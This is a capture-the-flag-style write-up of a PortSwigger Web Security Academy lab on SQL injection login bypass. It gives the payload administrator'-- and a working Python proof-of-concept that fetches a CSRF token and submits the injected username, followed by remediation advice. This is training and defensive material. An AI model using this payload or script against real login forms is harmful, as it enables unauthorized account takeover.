# SQL Injection Vulnerability Allowing Login Bypass
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-15

## The Problem
The application's login form checked credentials with a SQL query similar to:

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'whatever-was-entered'
```

The `username` field was taken directly from user input and concatenated into the query without sanitization or parameterization. This meant an attacker could manipulate the query's logic instead of supplying a real username.

## Discovery / Exploitation
Since both `username` and `password` are checked with `AND`, both conditions normally have to be true to log in. By injecting a payload into the `username` field that comments out the password check entirely, the password becomes irrelevant:

```
username: administrator'--
password: randomtext (anything works)
```

Resulting query:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'randomtext'
```

The `--` comments out everything after it, so `AND password = 'randomtext'` never executes. The query effectively becomes `WHERE username = 'administrator'`, which matches — logging the attacker in as administrator with no valid password at all.

## Impact
This allows full authentication bypass for any known username, without needing to know (or guess) the corresponding password. Since the target here was `administrator`, this results in complete account takeover of the highest-privilege user.

## Proof of Concept (Python)
This script routes traffic through Burp Suite (`127.0.0.1:8080`), fetches the CSRF token required by the login form, submits the injected payload as the username, and checks whether the response contains `"logout"` — confirming a successful authenticated session.

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": payload, "password": "randomtext"}
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "logout" in res:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example : %s https://www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    s = requests.session()
    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection successful! we have logged in as administrator user.')
    else:
        print('[-] SQL injection unsuccessful')
```

**How it works:**
1. Takes the target login URL and a SQLi payload (the manipulated username) as command-line arguments
2. Fetches the login page first to extract the CSRF token, required for the form to be accepted
3. Submits a POST request with the payload as `username` and an arbitrary `password`
4. Checks the response for `"logout"`, which only appears when logged in successfully
5. Prints whether the bypass succeeded

**Example run:**
```bash
python3 exploit_sqli_login.py https://your-lab-url.web-security-academy.net "administrator'--"
```

## Remediation
- Use **parameterized queries (prepared statements)** so user input is never treated as part of the SQL syntax.
- Never build authentication queries by concatenating raw input — this is one of the most damaging classes of SQL injection since it bypasses the entire login mechanism.
- Apply **rate limiting and account lockouts** on login attempts as defense in depth (won't stop injection, but slows down brute-force follow-up attempts).
- Log and alert on SQL syntax characters (`'`, `--`, `;`) appearing in authentication fields.

## Takeaway
This lab shows how the same core technique (breaking out of the intended string with `'` and using `--` to comment out the rest of the query) applies just as well to **authentication bypass** as it does to filter bypass (lab 1). Any field that gets concatenated into a SQL query — not just search or filter fields — is a potential injection point, including the fields you'd least expect an attacker to control meaningfully, like a username box.
